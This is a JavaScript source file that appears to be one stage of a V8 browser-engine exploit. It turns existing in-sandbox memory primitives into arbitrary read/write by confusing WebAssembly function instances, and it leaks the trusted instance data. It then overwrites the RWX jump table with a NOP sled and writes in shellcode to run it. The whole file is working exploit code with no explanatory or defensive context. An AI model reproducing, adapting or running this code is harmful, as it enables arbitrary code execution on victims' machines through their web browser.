const baseOffsets = {
        cagedAddressOffset: 0x40020,
        arrayBufferBackingOffset: 0x20,

        function_shared_info: 0x10,
        shred_info_wasm_function: 0x08,
        wasm_function_instance: 0x10,

        trustedInstanceRWX: 0x38,

};

export async function execute(version_hint, primitives, iomem) {
    const offsets = init(baseOffsets, version_hint);

    try {
        let {addrOf, cagedRead, cagedWrite} = primitives;
        let cageBase = cagedRead(BigInt(offsets.cagedAddressOffset)) & 0xffffffff00000000n;
        if ((cageBase & 0xffffffffffn) == 0n) cageBase = cageBase >> 8n; // Account for cage shift
        let iomemAddr = addrOf(iomem.buffer);
        let iomemBacking = BigInt(cagedRead(iomemAddr + BigInt(offsets.arrayBufferBackingOffset)) >> 24n) + cageBase;
        
        await console.log(`Cage Base`, to_hex(cageBase));

        async function confuse(instance, srcinstance, func) {
            let func_addr = addrOf(func);
            // await console.log(`Confusing WasmFunction`, to_hex(func_addr));
    
    
            let shared_info_addr = cagedRead(func_addr + BigInt(offsets.function_shared_info)) & 0xffffffffn;
            // await console.log(`Shared Info Addr`, to_hex(shared_info_addr));
            let wasm_func_addr = cagedRead(shared_info_addr + BigInt(offsets.shred_info_wasm_function)) & 0xffffffffn;
            // await console.log(`Wasm Function Addr`, to_hex(wasm_func_addr));
            let instance_addr = cagedRead(wasm_func_addr + BigInt(offsets.wasm_function_instance)) & 0xffffffffn;
    
            if (instance_addr == addrOf(srcinstance)) {
                cagedWrite(wasm_func_addr + BigInt(offsets.wasm_function_instance), addrOf(instance));
                // console.log(`Confused WasmFunction ${x}: ${to_hex(instance_addr)} -> ${to_hex(addrOf(srcinstance))}`);
                return;
            }
    
            throw new Error(`Failed to confuse WasmFunction`);
        }

        async function instance_leak_factory() {
            let target_builder = new WasmModuleBuilder();
            target_builder.addMemory(1, 1);
            target_builder.exportMemoryAs("memory");
            target_builder.addFunction("leak", makeSig(new Array(32).fill(kWasmI64), [kWasmI64])).exportFunc().addBody([
                kExprLocalGet, 13, // Arg 13 is the WasmTrustedInstanceData
            ]);
            target_builder.addFunction("trigger", makeSig([kWasmI64], [kWasmI64])).exportFunc().addBody([
                ...wasmI64Const(3),
            ]);

            let confused_builder = new WasmModuleBuilder();
            confused_builder.addMemory(1, 1);
            confused_builder.exportMemoryAs("memory");
            confused_builder.addFunction("leak", makeSig([], new Array(1).fill(kWasmI64))).exportFunc().addBody([
                ...wasmI64Const(3),
            ]);
            confused_builder.addFunction("trigger", makeSig([kWasmI64], [kWasmI64])).exportFunc().addBody([
                ...wasmI64Const(3),
            ]);
            
            let target_instance = target_builder.instantiate();
            let confused_instance = confused_builder.instantiate();
            await confuse(target_instance, confused_instance, confused_instance.exports.leak);
            return {target_instance, confused_instance};
        }

        async function readwrite_factory() {
            let target_builder = new WasmModuleBuilder();
            target_builder.addMemory(1, 1);
            target_builder.exportMemoryAs("memory");
            target_builder.addFunction("read", makeSig([kWasmI32], [kWasmI64])).exportFunc().addBody([
                kExprLocalGet, 0, 
                kExprI64LoadMem, 0, 0
            ]);
            target_builder.addFunction("write", makeSig([kWasmI64, kWasmI32], [])).exportFunc().addBody([
                kExprLocalGet, 1,
                kExprLocalGet, 0,
                kExprI64StoreMem, 0, 0,
            ]);

            let confused_builder = new WasmModuleBuilder();
            confused_builder.addFunction("read", makeSig([kWasmI64], [kWasmI64])).exportFunc().addBody([
                ...wasmI64Const(1),
            ]);
            confused_builder.addFunction("write", makeSig([kWasmI64, kWasmI64], [])).exportFunc().addBody([
            ]);

            let target_instance = target_builder.instantiate();
            let confused_instance = confused_builder.instantiate();
            await confuse(target_instance, confused_instance, confused_instance.exports.read);
            await confuse(target_instance, confused_instance, confused_instance.exports.write);

            let memoryBase = (cagedRead(addrOf(target_instance.exports.memory.buffer) + BigInt(offsets.arrayBufferBackingOffset)) >> 24n) + cageBase;
            console.log(`memoryBase`, to_hex(memoryBase));
            return {
                memRead: (addr) => {
                    return confused_instance.exports.read((addr - memoryBase) & 0xfffffffffffffffen);
                },
                memWrite: (addr, value) => {
                    return confused_instance.exports.write(value, (addr - memoryBase) & 0xfffffffffffffffen);
                }
            }
        }

        let instances = await instance_leak_factory();
        let trusted_instance_address = instances.confused_instance.exports.leak();
        await console.log(`WasmTrustedInstanceData`, to_hex(trusted_instance_address));

        let {memRead, memWrite} = await readwrite_factory();
        let rwx_addr = memRead(trusted_instance_address + BigInt(offsets.trustedInstanceRWX));
        await console.log(`RWX addr:`, to_hex(rwx_addr));

        
        // Overwrite the jump_table with nops
        memWrite(rwx_addr + 0x00n, 0x9090909090909090n);
        memWrite(rwx_addr + 0x08n, 0x9090909090909090n);
        memWrite(rwx_addr + 0x10n, 0x9090909090909090n);
        memWrite(rwx_addr + 0x18n, 0x9090909090909090n);
        
        // Copy in the shellcode after the nop sled
        let ushellcode = new Uint8Array(500 * 8);
        if (shellcode.length > ushellcode.length) {
            throw 'Shellcode too large';
        }
        ushellcode.set(shellcode);
        let fshellcode = new Float64Array(ushellcode.buffer);
        for (let x = 0; x < 508; x++) { // 512 is the amount of memory assigned to the rwx page
            memWrite(rwx_addr + BigInt(x * 8) + 0x20n, ftoi(fshellcode[x]));
        }

        await console.log(`Result:`, instances.target_instance.exports.trigger(iomemBacking));
        let data = new TextDecoder().decode(iomem.buffer);
        data = Array.from(data.matchAll(/[ -~]{1,}/g)).map(e => '\t' + e[0]).join('\n');
        await console.log(data);
    }
    catch(e) {
        console.log(e.stack || e);
    }
}